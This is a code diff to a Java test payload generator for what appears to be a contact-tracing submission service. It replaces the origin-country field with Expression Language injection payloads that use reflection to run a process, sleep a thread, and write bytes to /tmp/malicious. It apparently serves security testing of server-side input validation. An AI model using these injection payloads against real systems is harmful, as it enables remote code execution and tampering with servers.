@@ -22,12 +22,24 @@ public class SubmissionPayloadGenerator {
   private static final int ROLLING_PERIOD = 144; // 24*60/10
   private static final ReportType REPORT_TYPE = ReportType.CONFIRMED_TEST;
   private static final ByteString REQUEST_PADDING = ByteString.copyFrom(new byte[100]);
-  private static final List<String> VISITED_COUNTRIES = List.of("DE", "FR");
-  private static final String ORIGIN_COUNTRY = "DE";
+  private static final List<String> VISITED_COUNTRIES = List.of("DE", "IT");
+//  private static final String ORIGIN_COUNTRY = "DE";
+
+//  private static final String ORIGIN_COUNTRY = "NL";
+
+//  private static final String ORIGIN_COUNTRY = "${2+2}";
+//  private static final String ORIGIN_COUNTRY = "${validatedValue.class.forName('java.lang.Thread').newInstance().sleep(10000)}";
+//  private static final String ORIGIN_COUNTRY = "${validatedValue.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance(['sleep', '10']).start().waitFor()}";
+  private static final String ORIGIN_COUNTRY =
+    "${validatedValue.class.forName('java.io.FileOutputStream').getDeclaredConstructors()[3].newInstance('/tmp/malicious', true).write(65)}" +
+    "${validatedValue.class.forName('java.io.FileOutputStream').getDeclaredConstructors()[3].newInstance('/tmp/malicious', true).write(66)}" +
+    "${validatedValue.class.forName('java.io.FileOutputStream').getDeclaredConstructors()[3].newInstance('/tmp/malicious', true).write(67)}" +
+    "${validatedValue.class.forName('java.io.FileOutputStream').getDeclaredConstructors()[3].newInstance('/tmp/malicious', true).write(10)}";
+
   private static final boolean CONSENT_TO_FEDERATION = true;
   private static final int DAYS_SINCE_ONSET_OF_SYMPTOMS = 0;
   private static final String MOBILE_CLIENT_PAYLOAD_PB_PATH = "services/submission/src/test/resources/payload/";
-  private static final String MOBILE_CLIENT_PAYLOAD_PB_FILENAME = "mobile-client-payload.pb";
+  private static final String MOBILE_CLIENT_PAYLOAD_PB_FILENAME = "expression-language-payload.pb";
 
   public static void main(String[] args) throws IOException {
 
